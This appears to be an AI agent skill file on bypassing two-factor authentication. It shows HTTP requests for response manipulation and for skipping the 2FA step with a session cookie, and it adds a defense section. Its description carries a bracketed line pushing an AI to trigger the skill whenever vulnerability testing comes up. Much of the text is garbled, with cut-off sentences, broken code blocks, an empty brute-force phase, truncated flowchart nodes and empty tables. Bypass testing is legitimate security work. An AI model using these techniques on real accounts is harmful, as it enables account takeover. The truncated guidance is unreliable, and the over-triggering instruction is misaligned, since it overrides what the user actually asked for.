---
name: 2fa-multi-factor-bypass
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Exploit pervasive logical flaws in Multi-Factor Authentication (MFA/2FA) implementations to 
  bypass the secondary authentication challenge entirely. Techniques include response manipulation, 
  referal spoofing, token reuse, and predictable backup codes.
domain: cybersecurity
subdomain: bug-hunting
category: Logical Flaws
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0006]
  techniques: [T1111]
platforms: [web, mobile]
tags: [web-security, 2fa, mfa, bug-hunting, logical-flaw, authentication]
tools: [burp-suite]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# 2FA / MFA Bypass

## When to Use
- When auditing the authentication flow of a web or mobile application that implements SMS, Authenticator App (TOTP), or Email-based 2FA.
- To demonstrate how an attacker with compromised primary credentials (username/password) might circumvent the secondary layer of defense due to faulty business logic or state management by the server.

## Workflow

### Phase 1: Understanding 2FA Implementation Flaws

```text
# Concept: 2FA should be an unbreakable mathematical barrier However, developers often 
# implement the logic Common Flaws :
# 1. Response Manipulation: Altering the server's boolean response .
# 2. Status Code Manipulation: Changing a 401 Unauthorized to a 200 OK 3. Direct Object Reference (Incomplete Auth): Navigating 4. Token Reuse/Predictability: 5. Rate Limit Missing: ```

### Phase 2: Exploitation via Response Manipulation

```http
# Concept: The server sends a boolean indicating if the 2FA code was correct 1. The Intercept (Attacker enters a wrong code: 000000) POST /api/v1/2fa/verify HTTP/1.1
Host: target.com
{"code": "000000"}

# 2. The Original Response HTTP/1.1 401 Unauthorized
{"success": false, "message": "Invalid code"}

# 3. The Manipulation (Using Burp Suite 'Match and Replace' or manual interception )
HTTP/1.1 200 OK
{"success": true, "message": "Authenticated"}

# Result If the frontend exclusively handles the 2FA state ```

### Phase 3: Exploitation via Direct Routing Bypass (State Mismatch)

```http
# Concept: Sometimes, after validating the password the server sets the primary session cookie BEFORE the required 2FA 1. Login POST /login HTTP/1.1
{"username": "victim", "password": "Password1!"}

# Response HTTP/1.1 302 Found
Set-Cookie: session_id=abc123validthing;
Location: /2fa-challenge

# 2. The Bypass Instead of following the redirect GET /dashboard HTTP/1.1
Host: target.com
Cookie: session_id=abc123validthing;

# Result ```

### Phase 4: Exploitation via Token Guessing / Brute Force

```text
# Concept If a site ```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Compromise ] --> B[Encounter 2FA Challenge ]
    B --> C{Does ]}
    C -->|Yes| D[Test ]
    C -->|No| E[Check D --> F[Bypass ]
```

## 🔵 Blue Team Detection & Defense
- **Server-Side Validation**: Ensure **Rate Limiting (Strict)**: Implement **State Flow Enforcement**: The server Key Concepts
| Concept | Description |
|---------|-------------|
| State Machine | |
| TOTP (Time-based One-Time Password) | |

## References
- PortSwigger: [Multi-factor authentication vulnerabilities](https://portswigger.net/web-security/authentication/multi-factor)
- OWASP: [Testing for Weak Authentication](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel)
